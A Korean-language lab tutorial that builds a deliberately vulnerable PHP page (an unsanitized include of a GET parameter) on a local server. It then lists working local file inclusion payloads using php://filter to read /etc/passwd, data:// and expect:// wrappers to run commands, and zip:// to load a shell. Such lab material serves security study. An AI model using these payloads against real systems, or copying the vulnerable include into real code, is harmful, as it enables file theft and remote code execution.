# PHP wrapper

| wrapper   | description   |
| :---      | :---:         |
| php://    | 다양항 I/O 스트림 래퍼 |
| zlib://   | 압축 스트림 래퍼 |
| expect:// | PTY를 통해 프로세스의 stdio, stdout, stderr에 대한 액세스 제공 |

https://www.php.net/manual/en/wrappers.expect.php
https://www.php.net/manual/en/wrappers.php

# **INDEX**

**1. [php://](#php:)**

# **환경 구성**

실행 환경

| Type          | Version                   |
| :---          | :---                      |
| OS            | Ubuntu 20.04.3 LTS        |
| Architecture  | x86-64                    |
| IP            | 192.168.0.58              |
| php           | 7.4                       |
| apache2       | 2.4.41-4ubuntu3.10        |

apache와 php를 설치하자.

```sh
root@ubuntu:~# apt -y install apache2 php
```

php wrapper에 대한 공격에 취약한 페이지(index.php)를 만들자.

```php
<?php
    if (empty($_GET['page'])) echo 'PHP wrapper';
    else include $_GET['page'];
?>
```

# **php:**

http://192.168.0.58/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
http://192.168.0.58/index.php?page=php://filter/string.rot13/resource=/etc/passwd


```sh
root@ubuntu:~# vi /etc/php/7.4/apache2/php.ini
```
```ini
allow_url_include = On
```

http://192.168.0.58/index.php?page=data://text/plain,<?php system('id');?>
http://192.168.0.58/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==


```sh
root@ubuntu:~# apt -y install php-dev php-pear tcl tcl-tclreadline tcl-dev tcl-expect-dev expect expect-dev tk tk-dev
root@ubuntu:~# pecl install expect
```

```sh
root@ubuntu:~# vi /etc/php/7.4/apache2/php.ini
root@ubuntu:~# vi /etc/php/7.4/cli/php.ini
```
```ini
extension=expect.so
```

http://192.168.0.58/index.php?page=expect://id

```sh
root@ubuntu:~# apt -y install php-zip
```

apache2의 계정(www-data)이 압축을 풀 디렉토리의 권한을 가지고 있어야함

http://192.168.0.58/index.php?page=zip://shell.zip%23shell.php
